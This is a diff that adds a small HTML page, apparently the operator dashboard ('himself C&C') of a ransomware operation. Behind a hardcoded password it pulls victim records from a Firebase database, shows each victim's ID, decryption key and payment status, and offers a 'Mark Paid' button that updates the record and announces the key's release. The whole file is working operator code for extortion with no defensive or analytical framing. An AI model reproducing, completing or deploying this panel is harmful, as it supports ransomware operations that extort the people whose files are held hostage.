@@ -1,0 +1,48 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>himself panel</title>
+<style>
+body{background:#111;color:#0f0;font:14px monospace}
+input,button{background:#222;color:#0f0;border:1px solid #0f0}
+#login{display:flex;flex-direction:column;width:200px;margin:auto}
+.hidden{display:none}
+</style>
+</head>
+<body>
+<div id="login">
+ <input id="pw" type="password" placeholder="password">
+ <button onclick="auth()">Enter</button>
+</div>
+<div id="panel" class="hidden">
+ <h2>himself C&C</h2>
+ <ul id="vics"></ul>
+</div>
+<script>
+const DB="https://YOURPROJECT-default-rtdb.europe-west1.firebasedatabase.app";
+function auth(){
+ if(document.getElementById('pw').value==="DARK123"){
+  document.getElementById('login').classList.add('hidden');
+  document.getElementById('panel').classList.remove('hidden');
+  loadVics();
+ }else{alert('Wrong password');}
+}
+function loadVics(){
+ fetch(DB+"/.json").then(r=>r.json()).then(d=>{
+  const ul=document.getElementById('vics');
+  ul.innerHTML="";
+  for(let k in d){
+   let li=document.createElement("li");
+   li.innerHTML=`ID: <b>${k}</b> | KEY: <code>${d[k].key}</code> | PAID: ${d[k].paid||0}  <button onclick="markPaid('${k}')">Mark Paid</button>`;
+   ul.appendChild(li);
+  }
+ });
+}
+function markPaid(id){
+ fetch(DB+"/"+id+"/.json",{method:"PATCH",body:JSON.stringify({paid:1})})
+  .then(()=>{alert("Paid → key released"); loadVics();});
+}
+</script>
+</body>
+</html>
